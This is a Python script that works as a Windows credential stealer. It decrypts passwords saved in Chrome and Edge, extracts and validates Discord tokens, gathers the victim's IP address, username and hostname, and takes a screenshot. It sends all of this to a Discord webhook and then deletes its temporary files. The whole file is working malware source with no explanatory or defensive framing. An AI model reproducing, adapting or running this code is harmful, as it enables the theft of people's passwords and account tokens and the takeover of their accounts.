WEBHOOK_URL = ""
import requests, getpass, sqlite3, shutil, socket, base64, dpapi, json, mss, re, os
from Crypto.Cipher import AES

LOCAL = os.getenv("LOCALAPPDATA")
ROAMING = os.getenv("APPDATA")

CHROMIUM_DIRS = [
    f"{LOCAL}\\Google\\Chrome",
    f"{LOCAL}\\Microsoft\\Edge",
    f"{LOCAL}\\Google\\Chrome SxS",
]

DISCORD_DIRS = [
    f"{ROAMING}\\discord",
    f"{ROAMING}\\discordcanary",
    f"{ROAMING}\\Lightcord",
    f"{ROAMING}\\discordptb",
]

data = ""

def getUserInfo(token:str):
    if not token: return False
    headers = {
        "Content-Type": "application/json",
        "Authorization": token
    }
    res = requests.get("https://discord.com/api/v9/users/@me", headers=headers)
    return str(res.status_code)[0] == "2", res.text

def findDiscordTokens():
    tokens = {}
    for discord in DISCORD_DIRS:
        localState = f"{discord}\\Local State"
        leveldb = f"{discord}\\Local Storage\\leveldb"
        if not os.path.exists(leveldb):
            continue
        with open(localState, encoding="utf-8") as f:
            d = json.load(f)
        encryptedKey = d["os_crypt"]["encrypted_key"]
        encryptedKey = encryptedKey.encode("utf-8")
        encryptedKey = base64.b64decode(encryptedKey)[5:]
        #secretKey = win32crypt.CryptUnprotectData(encryptedKey, None, None, None, 0)[1]
        secretKey = dpapi.unprotect(encryptedKey)
        for file in os.listdir(leveldb):
            if not file.endswith((".log",".ldb")):
                continue
            with open(os.path.join(leveldb, file), "r", errors="ignore") as file:
                lines = file.readlines()
                for line in lines:
                    for regexLine in re.findall("dQw4w9WgXcQ:[^\"]*", line):
                        try:
                            x = base64.b64decode(regexLine.split("dQw4w9WgXcQ:")[1])
                            initialisationVector = x[3:15]
                            encryptedToken = x[15:]
                            cipher = AES.new(secretKey, AES.MODE_GCM, initialisationVector) 
                            token = cipher.decrypt(encryptedToken)[:-16].decode()
                            userInfo = getUserInfo(token)
                            if userInfo[0]:
                                if token in tokens:
                                    continue
                                tokens[token] = userInfo[1]
                                break
                        except Exception as e:
                            continue
    return tokens

def findChromiumDatas():
    resultStr = "===== Find Chromium Datas =====\n"
    for dir in CHROMIUM_DIRS:
        localState = f"{dir}\\User Data\\Local State"
        if not os.path.exists(localState):
            continue
        resultStr += "===== "+dir.split("\\")[-1]+" =====\n"
        with open(localState, encoding="utf-8") as f:
            d = json.load(f)
        profiles = d["profile"]["info_cache"]
        encryptedKey = d["os_crypt"]["encrypted_key"]
        encryptedKey = encryptedKey.encode("utf-8")
        encryptedKey = base64.b64decode(encryptedKey)[5:]
        #secretKey = win32crypt.CryptUnprotectData(encryptedKey, None, None, None, 0)[1]
        secretKey = dpapi.unprotect(encryptedKey)
        for profileName in profiles:
            profile = profiles[profileName]
            resultStr += profileName+":\n    Email:"+profile["user_name"]+"\n    Name:"+profile["gaia_name"]+"\n    LoginData:\n"
            loginDataDb = f"{dir}\\User Data\\{profileName}\\Login Data"
            shutil.copy2(loginDataDb, "loginData")
            c = sqlite3.connect("loginData")
            cu = c.cursor()
            cu.execute("SELECT action_url, username_value, password_value FROM logins")
            for i,l in enumerate(cu.fetchall()):
                url = l[0]
                username = l[1]
                initialisationVector = l[2][3:15]
                encryptedPassword = l[2][15:-16]
                cipher = AES.new(secretKey, AES.MODE_GCM, initialisationVector) 
                password = cipher.decrypt(encryptedPassword).decode()
                if url and username and password:
                    resultStr += f"\n        ServiceUrl:{url}\n        Username:{username}\n        Password:{password}\n"
            c.close()
    return resultStr

def main():
    print("Start....")
    resultStr = findChromiumDatas()
    tokens = findDiscordTokens()
    
    ip = requests.get("https://ifconfig.me").text
    useUser = getpass.getuser()
    hostName = socket.gethostname()
    
    monitor = {
        "left": 0,
        "top": 0,
        "width": 1920,
        "height": 1080
    }
    with mss.mss() as sct:
        screenshot = sct.grab(monitor)
        mss.tools.to_png(screenshot.rgb, screenshot.size, output="screenshot.png")
    screenshot = open("screenshot.png", "rb")
    message = f"""# Grabber Result\n```\nIP:{ip}\nUseUser:{useUser}\nHostName:{hostName}```\n## Tokens\n```\n"""
    for token in tokens:
        userInfo = json.loads(tokens[token])
        message += f"""Token - {token}\nUserId - {userInfo["id"]}\nUserName - {userInfo["username"]}\nGlobalName - {userInfo["global_name"]}\nEmail - {userInfo["email"]}\nPhoneNumber - {userInfo["phone"]}\n\n"""
    message += "```"
    requests.post(WEBHOOK_URL, data={"content": message}, files= {"file": screenshot})
    requests.post(WEBHOOK_URL, files= {"file": ("loginData.txt", resultStr.encode())})
    
    screenshot.close()
    
    files = ["loginData", "screenshot.png"]
    for file in files:
        os.remove(file)
if __name__ == "__main__":
    main()